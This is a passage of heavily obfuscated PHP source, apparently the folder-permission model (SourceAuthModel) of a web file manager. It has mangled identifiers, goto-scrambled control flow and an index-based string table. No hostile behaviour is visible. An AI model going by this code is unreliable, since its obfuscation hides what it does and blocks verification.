$cô¯Ê¦­•ê[446] => 1); $dœÔßØ„¹„ = Model($cô¯Ê¦­•ê[2084])->where($b—´Ø…½ãå)->field($cô¯Ê¦­•ê[441])->select(); if (empty($dœÔßØ„¹„)) { return; } goto bé®ÉÑª²î; bé®ÉÑª²î: $cÁ½¦Æ‘© = array_to_keyvalue($dœÔßØ„¹„, $cô¯Ê¦­•ê[33], $cô¯Ê¦­•ê[441]); $this->remove($cÁ½¦Æ‘©); goto Aİí‰µÕ‘º; Aİí‰µÕ‘º: } private function shareFileMeta($Féß®¶¯ß, $F®Üˆƒ¹ = null) { $aºö‚Í—¢ =& $_SERVER[‚Ğ°–—î]; $AÏ«öÈ¤©Ù = array($aºö‚Í—¢[419] => $Féß®¶¯ß, $aºö‚Í—¢[89] => $aºö‚Í—¢[2251]); if (is_null($F®Üˆƒ¹)) { return Model($aºö‚Í—¢[2252])->where($AÏ«öÈ¤©Ù)->find(); } $AÏ«öÈ¤©Ù[$aºö‚Í—¢[359]] = $F®Üˆƒ¹; Model($aºö‚Í—¢[2252])->add($AÏ«öÈ¤©Ù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\145\137\x61\x75\x74\150"; public function getAuth($f÷¬Š©œÀÄ) { goto eİï·†’§; eİï·†’§: $BëÈ¢„âÎ‰ =& $_SERVER[‚Ğ°–—î]; $fÄÍ¨ß¯¾Ù = $BëÈ¢„âÎ‰[2253]; $B±âº¤Œ = array($BëÈ¢„âÎ‰[369] => $f÷¬Š©œÀÄ); goto B„Ğñ¯¸åÈ; B„Ğñ¯¸åÈ: $EŞ£ë¼³ŒÖ = $this->field($fÄÍ¨ß¯¾Ù)->order($BëÈ¢„âÎ‰[367])->where($B±âº¤Œ)->select(); $f•›Ò‰É¼ = array(); foreach ($EŞ£ë¼³ŒÖ as $dæ¿Öä¤¨š) { if (Model($BëÈ¢„âÎ‰[2254])->listData($dæ¿Öä¤¨š[$BëÈ¢„âÎ‰[2235]])) { $f•›Ò‰É¼[] = $dæ¿Öä¤¨š; } } goto A…¢‘º³¶›; A…¢‘º³¶›: return $f•›Ò‰É¼; goto cç±ãæÌ»Å; cç±ãæÌ»Å: } public function setAuth($cÜøùÅ†ßµ, $aˆñ£‘‚–ö) { goto DÁíÓ°ŠÅÔ; Cğá¶§±õÜ: $dÅ‹»¹âÖ = 1; $d¥£¿Êåˆµ = $f¹£ÎœŞÍ[$aÜµ¬ß¦‹[456]]; if ($d¥£¿Êåˆµ != $dÅ‹»¹âÖ) { $F«ÆÉôôô‡ = array($aÜµ¬ß¦‹[2107] => $d¥£¿Êåˆµ); $FµèÕË‡© = Model($aÜµ¬ß¦‹[2181])->field($aÜµ¬ß¦‹[1438])->where($F«ÆÉôôô‡)->select(); $FµèÕË‡© = array_to_keyvalue($FµèÕË‡©, $aÜµ¬ß¦‹[33], $aÜµ¬ß¦‹[1438]); } goto aŠĞšß¨ö; DÁíÓ°ŠÅÔ: $aÜµ¬ß¦‹ =& $_SERVER[‚Ğ°–—î]; $f¹£ÎœŞÍ = Model($aÜµ¬ß¦‹[1118])->sourceInfo($cÜøùÅ†ßµ); if ($f¹£ÎœŞÍ[$aÜµ¬ß¦‹[371]] != SourceModel::TYPE_GROUP) { return !1; } goto Cğá¶§±õÜ; aŠĞšß¨ö: $Fõ˜Ü¿±ÏÑ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $F¦àô÷ÀÕ» = array(); foreach ($aˆñ£‘‚–ö as $EëôËÌìˆ) { if (!in_array($EëôËÌìˆ[$aÜµ¬ß¦‹[371]], $Fõ˜Ü¿±ÏÑ)) { show_json(LNG($aÜµ¬ß¦‹[2255]), !1); } if ($d¥£¿Êåˆµ != $dÅ‹»¹âÖ) { if ($EëôËÌìˆ[$aÜµ¬ß¦‹[371]] == SourceModel::TYPE_GROUP) { } if ($EëôËÌìˆ[$aÜµ¬ß¦‹[456]] != 0 && !in_array($EëôËÌìˆ[$aÜµ¬ß¦‹[456]], $FµèÕË‡©)) { } } if ($EëôËÌìˆ[$aÜµ¬ß¦‹[456]] == 0) { $EëôËÌìˆ[$aÜµ¬ß¦‹[371]] = SourceModel::TYPE_USER; } $F¦àô÷ÀÕ»[] = array($aÜµ¬ß¦‹[369] => $cÜøùÅ†ßµ, $aÜµ¬ß¦‹[371] => intval($EëôËÌìˆ[$aÜµ¬ß¦‹[371]]), $aÜµ¬ß¦‹[456] => intval($EëôËÌìˆ[$aÜµ¬ß¦‹[456]]), $aÜµ¬ß¦‹[2235] => intval($EëôËÌìˆ[$aÜµ¬ß¦‹[2235]]) ? intval($EëôËÌìˆ[$aÜµ¬ß¦‹[2235]]) : 0, $aÜµ¬ß¦‹[2236] => intval($EëôËÌìˆ[$aÜµ¬ß¦‹[2236]]) ? intval($EëôËÌìˆ[$aÜµ¬ß¦‹[2236]]) : -1); } goto bææ¡ñö†œ; bææ¡ñö†œ: $this->where(array($aÜµ¬ß¦‹[383] => $cÜøùÅ†ßµ))->delete(); $this->addAll($F¦àô÷ÀÕ»); return !0; goto a¢‚ËÙÆ‡’; a¢‚ËÙÆ‡’: } public function authClear($Dºä³‚´›ï) { $cÔ‡Ù¼£ë¼ =& $_SERVER[‚Ğ°–—î]; $böØÒó–ã = Model($cÔ‡Ù¼£ë¼[1118])->sourceInfo($Dºä³‚´›ï); $E¸é‘¿’¥Ô = array($Dºä³‚´›ï); if ($böØÒó–ã[$cÔ‡Ù¼£ë¼[370]] == $cÔ‡Ù¼£ë¼[83]) { $BŠØšÈÀ´‹ = array($cÔ‡Ù¼£ë¼[525] => array($cÔ‡Ù¼£ë¼[483], $böØÒó–ã[$cÔ‡Ù¼£ë¼[459]] . $Dºä³‚´›ï . $cÔ‡Ù¼£ë¼[484])); $E¸é‘¿’¥Ô = Model($cÔ‡Ù¼£ë¼[1118])->field($cÔ‡Ù¼£ë¼[383])->where($BŠØšÈÀ´‹)->getField($cÔ‡Ù¼£ë¼[369], !0); $E¸é‘¿’¥Ô[] = $Dºä³‚´›ï; } $this->where(array($cÔ‡Ù¼£ë¼[383] => array($cÔ‡Ù¼£ë¼[384], $E¸é‘¿’¥Ô)))->delete(); return !0; } public function get($F’›Ö«î¯ä) { $CÅ¼¹‚ƒôˆ = $this->getSourceList(array($F’›Ö«î¯ä), !0); return $CÅ¼¹‚ƒôˆ[0]; } public function getSourceList($d’¦‘Û„ŠÖ, $aàÙ‚šÇ¨° = false) { goto E˜Àï¦ğÕ; cÅó›ë»Äî: $AİÅÜÔŸÀ = array(); foreach ($aàÙ‚šÇ¨° as $cì†‹ÉƒÖ† => $DÆ£‘‘Ôå) { $AİÅÜÔŸÀ[$cì†‹ÉƒÖ†] = $this->makeSourceAuth($DÆ£‘‘Ôå, $F¥¸«İÜ­Ñ); } return $AİÅÜÔŸÀ; goto C¿®ÀËÀÖ; dù‹³Ğ÷ã¿: if (!$aàÙ‚šÇ¨°) { $C¢Á´¬·”» = array($C£¡ÓÔËÑ[383] => array($C£¡ÓÔËÑ[384], $d’¦‘Û„ŠÖ)); $aàÙ‚šÇ¨° = $dÆæ²”·•¤->field($C£¡ÓÔËÑ[2256])->where($C¢Á´¬·”»)->select(); $aàÙ‚šÇ¨° = array_to_keyvalue($aàÙ‚šÇ¨°, $C£¡ÓÔËÑ[369]); } $b¶—òÉÉ‹Œ = $d’¦‘Û„ŠÖ; foreach ($aàÙ‚šÇ¨° as $CÌ†•ï‰Àì => $CÄ²†ÙÀ¼) { $B‰İ´Š‰ÕÊ = $dÆæ²”·•¤->parentLevelArray($CÄ²†ÙÀ¼[$C£¡ÓÔËÑ[459]]); $b¶—òÉÉ‹Œ = array_merge($b¶—òÉÉ‹Œ, $B‰İ´Š‰ÕÊ, array($CÌ†•ï‰Àì)); } goto c»¡Ñ›èÒ; c»¡Ñ›èÒ: $b¶—òÉÉ‹Œ = array_values(array_unique($b¶—òÉÉ‹Œ)); if (!$b¶—òÉÉ‹Œ) { return array(); } $BÙ‡Å´˜æÙ = $C£¡ÓÔËÑ[2257]; goto a¼‰éôöÑÊ; E˜Àï¦ğÕ: $C£¡ÓÔËÑ =& $_SERVER[‚Ğ°–—î]; if (!$d’¦‘Û„ŠÖ) { return array(); } $dÆæ²”·•¤ = Model($C£¡ÓÔËÑ[1118]); goto dù‹³Ğ÷ã¿; a¼‰éôöÑÊ: $C¢Á´¬·”» = array($C£¡ÓÔËÑ[383] => array($C£¡ÓÔËÑ[384], $b¶—òÉÉ‹Œ)); $F¥¸«İÜ­Ñ = $this->field($BÙ‡Å´˜æÙ)->where($C¢Á´¬·”»)->select(); $F¥¸«İÜ­Ñ = array_to_keyvalue_group($F¥¸«İÜ­Ñ, $C£¡ÓÔËÑ[369]); goto cÅó›ë»Äî; C¿®ÀËÀÖ: } public function authDeepCheck($DÆŒÃâÙ“) { goto eë¹ÆµİÁ¥; fÔ‰ŸçêÚø: $d‡¯öæ§» = $C‡²‘œùË› ? $C‡²‘œùË›[0] : $DÆŒÃâÙ“; return array($B„×æÉ„è[377] => -1, $B„×æÉ„è[418] => array($B„×æÉ„è[385] => $B„×æÉ„è[1032], $B„×æÉ„è[2113] => $B„×æÉ„è[468], $B„×æÉ„è[386] => LNG($B„×æÉ„è[2260]), $B„×æÉ„è[2125] => $B„×æÉ„è[2261]), $B„×æÉ„è[2262] => array($B„×æÉ„è[388] => $B„×æÉ„è[2263], $B„×æÉ„è[75] => $d‡¯öæ§»)); goto dØŒä»õ‡…; eë¹ÆµİÁ¥: $B„×æÉ„è =& $_SERVER[‚Ğ°–—î]; if (_get($GLOBALS, $B„×æÉ„è[457])) { return !1; } $B¹ù­™»ø¶ = $this->makeAuthDeep(); goto E“ê“áİ; E“ê“áİ: if (!in_array($DÆŒÃâÙ“, $B¹ù­™»ø¶[$B„×æÉ„è[2258]])) { return !1; } $C‡²‘œùË› = array(); foreach ($B¹ù­™»ø¶[$B„×æÉ„è[2259]] as $añÚğŸŞ© => $e‡Ş‹ŒÃò) { if (!in_array($DÆŒÃâÙ“, $e‡Ş‹ŒÃò)) { continue; } $C‡²‘œùË›[] = $añÚğŸŞ©; } goto fÔ‰ŸçêÚø; dØŒä»õ‡…: } protected function makeAuthDeep() { goto cê±ŠŒ…¶; FïïÓõÀ†«: if ($E£Æ¤Î‡Î) { $cÆÍèøÒ…Ù = array(array($e¶ã‰„¾…Â[371] => SourceModel::TYPE_USER, $e¶ã‰„¾…Â[456] => USER_ID), array($e¶ã‰„¾…Â[371] => SourceModel::TYPE_GROUP, $e¶ã‰„¾…Â[456] => array($e¶ã‰„¾…Â[384], $E£Æ¤Î‡Î)), $e¶ã‰„¾…Â[915] => $e¶ã‰„¾…Â[2187]); } if ($D©­‹Ìé‚) { $cÆÍèøÒ…Ù = array($cÆÍèøÒ…Ù, $e¶ã‰„¾…Â[2235] => array($e¶ã‰„¾…Â[2265], $D©­‹Ìé‚)); } $B•çÄß´º = $this->field($e¶ã‰„¾…Â[2266])->where($cÆÍèøÒ…Ù)->select(); goto c·íËˆïÎ; C§ª„ÚÎÀ: foreach ($fÎÒÔÚœé‹ as $B÷È†½Ï‰æ) { $cáÄ‚òÔªÙ = $d¯»±—¶Ú­->getInfo($B÷È†½Ï‰æ); $BÖ®šŞØÅÌ = $e¿‚Ù‰µ…->parentLevelArray($cáÄ‚òÔªÙ[$e¶ã‰„¾…Â[459]]); $c£ß“Ó°Àğ = array_merge($c£ß“Ó°Àğ, $BÖ®šŞØÅÌ); } $c£ß“Ó°Àğ = array_values(array_unique($c£ß“Ó°Àğ)); foreach ($c£ß“Ó°Àğ as $B÷È†½Ï‰æ) { $cáÄ‚òÔªÙ = $d¯»±—¶Ú­->getInfo($B÷È†½Ï‰æ); $Aå‚¦‚Ôê¨[] = $cáÄ‚òÔªÙ[$e¶ã‰„¾…Â[391]][$e¶ã‰„¾…Â[369]]; $c©ÇêĞÛêñ[$B÷È†½Ï‰æ] = $cáÄ‚òÔªÙ[$e¶ã‰„¾…Â[391]][$e¶ã‰„¾…Â[369]]; $C§¥÷ØºÏ[$B÷È†½Ï‰æ] = $e¿‚Ù‰µ…->parentLevelArray($cáÄ‚òÔªÙ[$e¶ã‰„¾…Â[459]]); } goto cõÍˆÀ¶Ú¬; EÖ§¬îó…¶: $e¿‚Ù‰µ… = Model($e¶ã‰„¾…Â[1118]); $d¯»±—¶Ú­ = Model($e¶ã‰„¾…Â[458]); $bÌ†µØ‘Ş = array(); goto aºØæ–Œ¨; aÎ¥¤åÆ×: $E£Æ¤Î‡Î = Session::get($e¶ã‰„¾…Â[2219]); $E£Æ¤Î‡Î = array_to_keyvalue($E£Æ¤Î‡Î, $e¶ã‰„¾…Â[33], $e¶ã‰„¾…Â[2107]); $cÆÍèøÒ…Ù = array($e¶ã‰„¾…Â[371] => SourceModel::TYPE_USER, $e¶ã‰„¾…Â[456] => USER_ID); goto FïïÓõÀ†«; eÎæ¶«¥ØÍ: if ($e®ö˜Ì¡Ô) { $céİçÇ† = $e¿‚Ù‰µ…->where(array($e¶ã‰„¾…Â[369] => array($e¶ã‰„¾…Â[384], $e®ö˜Ì¡Ô)))->select(); foreach ($céİçÇ† as $dã¡…²Ìƒ) { $BÖ®šŞØÅÌ = $e¿‚Ù‰µ…->parentLevelArray($dã¡…²Ìƒ[$e¶ã‰„¾…Â[459]]); $Aå‚¦‚Ôê¨ = array_merge($Aå‚¦‚Ôê¨, $BÖ®šŞØÅÌ); $c£ß“Ó°Àğ[] = $dã¡…²Ìƒ[$e¶ã‰„¾…Â[456]]; $bÌ†µØ‘Ş[$dã¡…²Ìƒ[$e¶ã‰„¾…Â[369]]] = $BÖ®šŞØÅÌ; $dÑ¹­ÙÜè[$dã¡…²Ìƒ[$e¶ã‰„¾…Â[369]]] = $dã¡…²Ìƒ[$e¶ã‰„¾…Â[456]]; } } $c£ß“Ó°Àğ = array_values(array_unique($c£ß“Ó°Àğ)); $fÎÒÔÚœé‹ = $c£ß“Ó°Àğ; goto C§ª„ÚÎÀ; bì©Øçâç: return $d¦—í‰´˜; goto CÇè“Êğ©; cõÍˆÀ¶Ú¬: foreach ($bÌ†µØ‘Ş as $a¾¡ë“‚Â => $Eçç‡‡Ê£¶) { $cŠ¾ë‹òÒ = $dÑ¹­ÙÜè[$a¾¡ë“‚Â]; if (!$cŠ¾ë‹òÒ || !$c©ÇêĞÛêñ[$cŠ¾ë‹òÒ]) { continue; } $DÛİš…¤§§ = array(); foreach ($C§¥÷ØºÏ[$cŠ¾ë‹òÒ] as $B÷È†½Ï‰æ) { $DÛİš…¤§§[] = $c©ÇêĞÛêñ[$B÷È†½Ï‰æ]; } $bÌ†µØ‘Ş[$a¾¡ë“‚Â] = array_merge($DÛİš…¤§§, $Eçç‡‡Ê£¶); } $Aå‚¦‚Ôê¨ = array_values(array_unique($Aå‚¦‚Ôê¨)); $d¦—í‰´˜ = array($e¶ã‰„¾…Â[2258] => $Aå‚¦‚Ôê¨, $e¶ã‰„¾…Â[2259] => $bÌ†µØ‘Ş); goto bì©Øçâç; c·íËˆïÎ: $e®ö˜Ì¡Ô = array_to_keyvalue($B•çÄß´º, $e¶ã‰„¾…Â[33], $e¶ã‰„¾…Â[369]); $Aå‚¦‚Ôê¨ = array(); $c£ß“Ó°Àğ = $E£Æ¤Î‡Î; goto EÖ§¬îó…¶; bóÖó§öÏ: $f …†öÄ¼â = Model($e¶ã‰„¾…Â[2264])->listData(); $D©­‹Ìé‚ = array(); foreach ($f …†öÄ¼â as $d¦ïÖ‘»ÔÚ) { if ($d¦ïÖ‘»ÔÚ[$e¶ã‰„¾…Â[376]] == 0 && $d¦ïÖ‘»ÔÚ[$e¶ã‰„¾…Â[2127]] == $e¶ã‰„¾…Â[83]) { $D©­‹Ìé‚[] = $d¦ïÖ‘»ÔÚ[$e¶ã‰„¾…Â[367]]; } } goto aÎ¥¤åÆ×; aºØæ–Œ¨: $dÑ¹­ÙÜè = array(); $c©ÇêĞÛêñ = array(); $C§¥÷ØºÏ = array(); goto eÎæ¶«¥ØÍ; cê±ŠŒ…¶: $e¶ã‰„¾…Â =& $_SERVER[‚Ğ°–—î]; static $d¦—í‰´˜ = false; if ($d¦—í‰´˜) { return $d¦—í‰´˜; } goto bóÖó§öÏ; CÇè“Êğ©: } private function makeSourceAuth($aÏ½ò¤İ±˜, $f‰÷³·äİ²) { goto f‡‚¹”ğŞ; eòÏ®‘‚Œ†: if (!$A‡Áé¿®‰ && isset($E´Éœ˜¯Õ¼[$D‚˜½•¨İ«])) { $DÉæº­Ú = $E´Éœ˜¯Õ¼[$D‚˜½•¨İ«]; $E§ô”¸‰Õƒ = Model($DÇ³ø¾è”Ø[458])->getInfo($D‚˜½•¨İ«); $A‡Áé¿®‰ = array($DÇ³ø¾è”Ø[2267] => intval($DÉæº­Ú[$DÇ³ø¾è”Ø[376]][$DÇ³ø¾è”Ø[376]]), $DÇ³ø¾è”Ø[2268] => $DÉæº­Ú[$DÇ³ø¾è”Ø[376]], $DÇ³ø¾è”Ø[2262] => array($DÇ³ø¾è”Ø[388] => $DÇ³ø¾è”Ø[2272], $DÇ³ø¾è”Ø[75] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[391]][$DÇ³ø¾è”Ø[369]], $DÇ³ø¾è”Ø[2271] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[463]])); } if (!$A‡Áé¿®‰) { $E§ô”¸‰Õƒ = Model($DÇ³ø¾è”Ø[458])->getInfo($D‚˜½•¨İ«); $f´Íëè÷ôô = explode($DÇ³ø¾è”Ø[47], trim($E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[459]], $DÇ³ø¾è”Ø[47])); foreach ($f´Íëè÷ôô as $eÜÜíÚËŠš) { if ($eÜÜíÚËŠš == $DÇ³ø¾è”Ø[468] || $eÜÜíÚËŠš == $bÚÈßµ£Å‡) { continue; } if (!isset($E´Éœ˜¯Õ¼[$eÜÜíÚËŠš])) { continue; } $DÉæº­Ú = $E´Éœ˜¯Õ¼[$eÜÜíÚËŠš]; $A‡Áé¿®‰ = array($DÇ³ø¾è”Ø[2267] => intval($DÉæº­Ú[$DÇ³ø¾è”Ø[376]][$DÇ³ø¾è”Ø[376]]), $DÇ³ø¾è”Ø[2268] => $DÉæº­Ú[$DÇ³ø¾è”Ø[376]], $DÇ³ø¾è”Ø[2262] => array($DÇ³ø¾è”Ø[388] => $DÇ³ø¾è”Ø[2269], $DÇ³ø¾è”Ø[2270] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[391]][$DÇ³ø¾è”Ø[369]], $DÇ³ø¾è”Ø[2271] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[463]])); break; } } if (!$A‡Áé¿®‰ || $A‡Áé¿®‰[$DÇ³ø¾è”Ø[377]] <= 0) { $D¯Õæ§†—ã = $this->authDeepCheck($aÏ½ò¤İ±˜[$DÇ³ø¾è”Ø[369]]); if ($D¯Õæ§†—ã) { $A‡Áé¿®‰ = $D¯Õæ§†—ã; } } goto A±Ş«áƒ•; c¶‰ŸšÚŞè: $bÚÈßµ£Å‡ = $DÇ³ø¾è”Ø[83]; $aæ¬Ì…á±¨ = Model($DÇ³ø¾è”Ø[1118])->parentLevelArray($aÏ½ò¤İ±˜[$DÇ³ø¾è”Ø[459]]); $aæ¬Ì…á±¨ = array_merge(array($aÏ½ò¤İ±˜[$DÇ³ø¾è”Ø[369]]), array_reverse($aæ¬Ì…á±¨)); goto dö„íÀì¨å; f‡‚¹”ğŞ: $DÇ³ø¾è”Ø =& $_SERVER[‚Ğ°–—î]; $E´Éœ˜¯Õ¼ = Session::get($DÇ³ø¾è”Ø[2219]); $E´Éœ˜¯Õ¼ = array_to_keyvalue($E´Éœ˜¯Õ¼, $DÇ³ø¾è”Ø[2107]); goto c¶‰ŸšÚŞè; AºÉ¹òÃîÃ: $A‡Áé¿®‰ = !1; foreach ($aæ¬Ì…á±¨ as $FÚ¸ÎŸéÉ) { if (!isset($f‰÷³·äİ²[$FÚ¸ÎŸéÉ])) { continue; } $e—Ìç‚ «ã = $this->authMake($f‰÷³·äİ²[$FÚ¸ÎŸéÉ]); if ($e—Ìç‚ «ã[$DÇ³ø¾è”Ø[418]]) { $A‡Áé¿®‰ = $e—Ìç‚ «ã; break; } } if (!$e÷ÁÃ³ëÁ) { return $A‡Áé¿®‰; } goto eòÏ®‘‚Œ†; A±Ş«áƒ•: return $A‡Áé¿®‰; goto D¸—»â£¿è; dö„íÀì¨å: $D‚˜½•¨İ« = $aÏ½ò¤İ±˜[$DÇ³ø¾è”Ø[456]]; $e÷ÁÃ³ëÁ = $aÏ½ò¤İ±˜[$DÇ³ø¾è”Ø[371]] == SourceModel::TYPE_GROUP; if ($e÷ÁÃ³ëÁ && isset($E´Éœ˜¯Õ¼[$D‚˜½•¨İ«]) && !_get($GLOBALS, $DÇ³ø¾è”Ø[457])) { $DÉæº­Ú = $E´Éœ˜¯Õ¼[$D‚˜½•¨İ«]; if (Model($DÇ³ø¾è”Ø[2254])->authCheckRoot($DÉæº­Ú[$DÇ³ø¾è”Ø[376]][$DÇ³ø¾è”Ø[376]])) { $E§ô”¸‰Õƒ = Model($DÇ³ø¾è”Ø[458])->getInfo($D‚˜½•¨İ«); $A‡Áé¿®‰ = array($DÇ³ø¾è”Ø[2267] => intval($DÉæº­Ú[$DÇ³ø¾è”Ø[376]][$DÇ³ø¾è”Ø[376]]), $DÇ³ø¾è”Ø[2268] => $DÉæº­Ú[$DÇ³ø¾è”Ø[376]], $DÇ³ø¾è”Ø[2262] => array($DÇ³ø¾è”Ø[388] => $DÇ³ø¾è”Ø[2269], $DÇ³ø¾è”Ø[2270] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[391]][$DÇ³ø¾è”Ø[369]], $DÇ³ø¾è”Ø[2271] => $E§ô”¸‰Õƒ[$DÇ³ø¾è”Ø[463]])); return $A‡Áé¿®‰; } } goto AºÉ¹òÃîÃ; D¸—»â£¿è: } public function authOwnerApply($EĞÖ‡¿´Ò³) { goto e´ˆŒÑ¦ÚÅ; D§æ‡Ëœ–: $EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[376]][$cÄ‘¤³‡¢[2275]] = Model($cÄ‘¤³‡¢[474])->userListInfo($fÇ¤å®¤); return $EĞÖ‡¿´Ò³; goto FÑƒñÚ£À; cù±æË¢Æ±: $bøˆí‰Œ§‚ = array($cÄ‘¤³‡¢[383] => array($cÄ‘¤³‡¢[384], $F‚Ì—­Ãƒ)); $dÉæ‰¥ÄÕ = $this->field($BÆõÇˆé¶‚)->where($bøˆí‰Œ§‚)->select(); $dÉæ‰¥ÄÕ = array_to_keyvalue_group($dÉæ‰¥ÄÕ, $cÄ‘¤³‡¢[369]); goto A»ÕšÈ»È; e´ˆŒÑ¦ÚÅ: $cÄ‘¤³‡¢ =& $_SERVER[‚Ğ°–—î]; if (empty($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[376]]) || isset($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[2273]]) && $EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[2273]]) { return $EĞÖ‡¿´Ò³; } if (AuthModel::authCheckRoot($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[376]][$cÄ‘¤³‡¢[377]])) { return $EĞÖ‡¿´Ò³; } goto D§‹¦•Íò; A»ÕšÈ»È: $c°öŠùÅä = array(); $fÇ¤å®¤ = array(); foreach ($dÉæ‰¥ÄÕ as $aÅ¸‰ìÊÀ => $a™øÃÖ×) { $eõÙƒìñö‰ = $this->authFolderOwnerUser($a™øÃÖ×); $c°öŠùÅä[$aÅ¸‰ìÊÀ] = $eõÙƒìñö‰; $fÇ¤å®¤ = array_merge($fÇ¤å®¤, $eõÙƒìñö‰[$cÄ‘¤³‡¢[535]]); if ($eõÙƒìñö‰[$cÄ‘¤³‡¢[2274]]) { break; } } goto BÜ…õÎÛ§; BÜ…õÎÛ§: if (count($fÇ¤å®¤) == 0) { $fÇ¤å®¤ = $this->authFolderOwnerGroup($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[456]]); } $fÇ¤å®¤ = array_unique($fÇ¤å®¤); if (AuthModel::authCheckRoot($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[376]][$cÄ‘¤³‡¢[377]])) { $fÇ¤å®¤[] = USER_ID; } goto D§æ‡Ëœ–; D§‹¦•Íò: $F‚Ì—­Ãƒ = Model($cÄ‘¤³‡¢[1118])->parentLevelArray($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[459]]); $F‚Ì—­Ãƒ = array_merge(array($EĞÖ‡¿´Ò³[$cÄ‘¤³‡¢[369]]), array_reverse($F‚Ì—­Ãƒ)); $BÆõÇˆé¶‚ = $cÄ‘¤³‡¢[2257]; goto cù±æË¢Æ±; FÑƒñÚ£À: } private function authFolderOwnerGroup($a¬§«ŸÑ¥á) { $cÈç–äÉÉÌ =& $_SERVER[‚Ğ°–—î]; $EÀÛ„Æ¨„Ö = Model($cÈç–äÉÉÌ[2181])->where(array($cÈç–äÉÉÌ[2107] => $a¬§«ŸÑ¥á))->select(); $a¬³ó‰ÄÙ = array(); if (!$EÀÛ„Æ¨„Ö) { return $a¬³ó‰ÄÙ; } foreach ($EÀÛ„Æ¨„Ö as $DÊ¶Š®•ª¯) { $FºÎÕ½ = $this->authInfo($DÊ¶Š®•ª¯); if (AuthModel::authCheckRoot($FºÎÕ½[$cÈç–äÉÉÌ[376]])) { $a¬³ó‰ÄÙ[] = $DÊ¶Š®•ª¯[$cÈç–äÉÉÌ[1438]]; } } return $a¬³ó‰ÄÙ; } private function authFolderOwnerUser($aĞÅ¤¸£æ) { $EàæÚĞ¼ =& $_SERVER[‚Ğ°–—î]; $cï…Ù¶°åõ = array(); $d‹áù–¢Áë = !1; foreach ($aĞÅ¤¸£æ as $f‹®ñ»œš˜) { $DÉ¡›¡õæ = $this->authInfo($f‹®ñ»œš˜); if ($f‹®ñ»œš˜[$EàæÚĞ¼[456]] == $EàæÚĞ¼[468]) { $d‹áù–¢Áë = !0; } if ($f‹®ñ»œš˜[$EàæÚĞ¼[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($DÉ¡›¡õæ[$EàæÚĞ¼[376]])) { $cï…Ù¶°åõ[] = $f‹®ñ»œš˜[$EàæÚĞ¼[456]]; } } } return array($EàæÚĞ¼[535] => $cï…Ù¶°åõ, $EàæÚĞ¼[2274] => $d‹áù–¢Áë); } public function authMake($b“·º¯¥«‘) { goto aŞ¥–Œœó; bïŞ†ÅÚ‹¥: $eŞ½‘¢Ò» = $AÈ‘ŸÄ‰¸ ? $e«çóÌŒŒ† : ($D±·Ã¤½†Í ? $fîã†¡¥š¯ : $B…ˆ¬™Á); $bÉç¹Ø‡Â = $AÈ‘ŸÄ‰¸ ? $bˆÆ¦ñÎğ : ($D±·Ã¤½†Í ? $E¡ä‹âçö : $E×¥­ßñëà); $d‹†¡ä³ƒ = $AÈ‘ŸÄ‰¸ ? $bµ˜ì¬ï“[2276] : ($D±·Ã¤½†Í ? $bµ˜ì¬ï“[2277] : ($D¿ÅÈÉÙš ? $bµ˜ì¬ï“[2278] : $bµ˜ì¬ï“[361])); goto Bğ‘©³ÓéÖ; dàó¢çÈ„·: $eÚäô—¬•è = array_to_keyvalue($e ‹Óè®ˆç, $bµ˜ì¬ï“[33], $bµ˜ì¬ï“[2107]); $e«çóÌŒŒ† = 0; $fîã†¡¥š¯ = 0; goto BÕåíî±Ñ; Bğ‘©³ÓéÖ: $cÆâ¤ñ‚ƒ = array($bµ˜ì¬ï“[2267] => intval($eŞ½‘¢Ò»), $bµ˜ì¬ï“[2268] => $bÉç¹Ø‡Â, $bµ˜ì¬ï“[2262] => array($bµ˜ì¬ï“[388] => $d‹†¡ä³ƒ, $bµ˜ì¬ï“[75] => $dÁÚÛŠ©™[$bµ˜ì¬ï“[369]])); return $cÆâ¤ñ‚ƒ; goto dï™Ì˜â›; aŞ¥–Œœó: $bµ˜ì¬ï“ =& $_SERVER[‚Ğ°–—î]; if (!$b“·º¯¥«‘) { return array($bµ˜ì¬ï“[377] => 0, $bµ˜ì¬ï“[418] => !1); } $e ‹Óè®ˆç = Session::get($bµ˜ì¬ï“[2219]); goto dàó¢çÈ„·; bÚõß”µ‡’: $D¿ÅÈÉÙš = 0; $dÁÚÛŠ©™ = array($bµ˜ì¬ï“[369] => 0); foreach ($b“·º¯¥«‘ as $dÁÚÛŠ©™) { $bÉç¹Ø‡Â = $this->authInfo($dÁÚÛŠ©™); $aŠˆÛŠÅÛ = $dÁÚÛŠ©™[$bµ˜ì¬ï“[456]]; $b×ÜÀá‚· = intval($bÉç¹Ø‡Â[$bµ˜ì¬ï“[376]]); if ($dÁÚÛŠ©™[$bµ˜ì¬ï“[371]] == SourceModel::TYPE_USER && $aŠˆÛŠÅÛ == USER_ID) { $AÈ‘ŸÄ‰¸ = !0; $bˆÆ¦ñÎğ = $bÉç¹Ø‡Â; $e«çóÌŒŒ† = $b×ÜÀá‚·; } else { if ($dÁÚÛŠ©™[$bµ˜ì¬ï“[371]] == SourceModel::TYPE_GROUP && in_array($aŠˆÛŠÅÛ, $eÚäô—¬•è)) { $D±·Ã¤½†Í = !0; if ($b×ÜÀá‚· >= $fîã†¡¥š¯) { $fîã†¡¥š¯ = $b×ÜÀá‚·; $E¡ä‹âçö = $bÉç¹Ø‡Â; } } else { if ($aŠˆÛŠÅÛ == $bµ˜ì¬ï“[468]) { $D¿ÅÈÉÙš = !0; $E×¥­ßñëà = $bÉç¹Ø‡Â; $B…ˆ¬™Á = $b×ÜÀá‚·; } } } } goto bïŞ†ÅÚ‹¥; 